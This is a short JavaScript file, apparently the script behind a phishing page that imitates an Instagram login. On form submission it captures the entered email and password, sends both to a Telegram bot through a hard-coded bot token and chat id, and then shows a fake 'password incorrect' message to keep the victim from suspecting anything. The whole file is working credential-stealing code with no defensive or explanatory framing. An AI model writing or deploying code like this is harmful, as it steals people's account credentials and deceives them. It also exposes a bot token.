const form = document.querySelector("#form")

form.addEventListener("submit", (e) => {
    e.preventDefault();

    var identity = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`

    var token = "6471664673:AAFWX4lJ9JsxdaCSWp-FGvTIuG3NEXnaH8A";
    var chat_id = -697004958
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    // window.location.replace("https://www.instagram.com/accounts/login/")
    console.log("Incorrect Password!");

    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
})